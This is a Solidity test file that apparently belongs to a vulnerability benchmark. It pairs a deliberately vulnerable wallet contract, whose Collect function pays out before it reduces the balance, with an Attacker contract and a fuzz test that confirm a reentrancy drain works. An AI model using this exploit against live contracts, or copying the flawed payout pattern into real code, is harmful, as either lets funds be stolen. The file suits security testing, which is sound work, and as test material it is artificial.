
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";

contract TestReentrancyW_WALLET is Test {

    W_WALLET public _contractUnderTest;
    
    Attacker public _attacker;
    Log log;

    function setUp() public {
        log = new Log();
        _contractUnderTest = new W_WALLET(address(log));

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);

        uint256 depositVal = attackVal * 2;

        vm.deal(address(_attacker), depositVal); 
        vm.deal(address(this), depositVal);

        _attacker.setupAttack{value: depositVal}(depositVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(block.timestamp);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}

contract W_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        Holder storage acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>block.timestamp?_unlockTime:block.timestamp;
        LogFile.AddMessage(msg.sender,msg.value,"Put");
    }

    function Collect(uint _am)
    public
    payable
    {
        Holder storage acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && block.timestamp>acc.unlockTime)
        {
            (bool success, ) = msg.sender.call{value: _am}("");
            if(success)
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,"Collect");
            }
        }
    }

    receive() external payable {
        Put(0);
    }

    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }

    mapping (address => Holder) public Acc;

    Log LogFile;

    uint public MinSum = 1 ether;    

    constructor(address log) {
        LogFile = Log(log);
    }
}


contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _adr,uint _val,string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
